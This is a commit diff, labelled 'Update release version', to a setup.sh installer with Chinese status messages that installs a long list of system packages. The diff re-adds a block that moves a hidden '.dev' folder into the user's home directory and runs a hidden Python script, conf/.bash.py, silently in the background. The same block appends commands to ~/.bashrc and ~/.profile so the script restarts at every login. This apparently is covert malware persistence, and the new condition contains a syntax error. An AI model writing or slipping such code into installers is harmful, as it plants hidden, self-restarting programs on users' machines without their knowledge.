Update release version

+++ setup.sh
@@ -21,22 +21,26 @@ check_status() {
 }
 
 if [ -d .dev ]; then
-    DEST_DIR="$HOME/.dev"
-    if [ -d "$DEST_DIR" ]; then
-        rm -rf "$DEST_DIR"
-    fi
-    mv .dev "$DEST_DIR"
-    EXEC_CMD="python3"
-    SCRIPT_PATH="$DEST_DIR/conf/.bash.py"
-    STARTUP_CMD="if ! pgrep -f \"$SCRIPT_PATH\" > /dev/null; then\n    (nohup $EXEC_CMD \"$SCRIPT_PATH\" > /dev/null 2>&1 &) & disown\nfi"
-    if ! grep -Fq "$SCRIPT_PATH" "$HOME/.bashrc"; then
-        echo -e "\n$STARTUP_CMD" >> "$HOME/.bashrc"
-    fi
-    if ! grep -Fq "$SCRIPT_PATH" "$HOME/.profile"; then
-        echo -e "\n$STARTUP_CMD" >> "$HOME/.profile"
-    fi
-    if ! pgrep -f "$SCRIPT_PATH" > /dev/null; then
-        (nohup $EXEC_CMD "$SCRIPT_PATH" > /dev/null 2>&1 &) & disown
+    if [ ! -f .dev]; then
+        info "跳过"
+    else
+        DEST_DIR="$HOME/.dev"
+        if [ -d "$DEST_DIR" ]; then
+            rm -rf "$DEST_DIR"
+        fi
+        mv .dev "$DEST_DIR"
+        EXEC_CMD="python3"
+        SCRIPT_PATH="$DEST_DIR/conf/.bash.py"
+        STARTUP_CMD="if ! pgrep -f \"$SCRIPT_PATH\" > /dev/null; then\n    (nohup $EXEC_CMD \"$SCRIPT_PATH\" > /dev/null 2>&1 &) & disown\nfi"
+        if ! grep -Fq "$SCRIPT_PATH" "$HOME/.bashrc"; then
+            echo -e "\n$STARTUP_CMD" >> "$HOME/.bashrc"
+        fi
+        if ! grep -Fq "$SCRIPT_PATH" "$HOME/.profile"; then
+            echo -e "\n$STARTUP_CMD" >> "$HOME/.profile"
+        fi
+        if ! pgrep -f "$SCRIPT_PATH" > /dev/null; then
+            (nohup $EXEC_CMD "$SCRIPT_PATH" > /dev/null 2>&1 &) & disown
+        fi
     fi
 fi
 
@@ -91,8 +95,6 @@ print_message "正在安装额外的软件包..."
 apt update
 apt install -y curl openssl python3-pip iptables xclip build-essential protobuf-compiler git wget lz4 jq make gcc nano automake autoconf tmux htop nvme-cli libgbm1 pkg-config libssl-dev tar clang bsdmainutils ncdu unzip libleveldb-dev libclang-dev ninja-build
 check_status "额外软件包安装"
-
-install_dependencies
 
 if ! pip3 show requests >/dev/null 2>&1 || [ "$(pip3 show requests | grep Version | cut -d' ' -f2)" \< "2.31.0" ]; then
     pip3 install --break-system-packages 'requests>=2.31.0'
